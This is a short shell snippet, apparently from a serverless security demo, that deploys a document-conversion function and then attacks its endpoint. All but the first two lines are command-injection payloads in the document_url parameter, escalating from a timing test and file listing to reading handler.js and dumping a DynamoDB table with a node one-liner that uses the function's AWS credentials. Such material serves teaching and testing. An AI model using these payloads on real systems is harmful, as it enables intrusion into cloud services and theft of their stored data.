```
sls deploy
curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=www.snee.com/xml/xslt/sample.doc"
curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; sleep 10 #"
curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; ls #"
curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; cat handler.js #"
curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();' # "
```
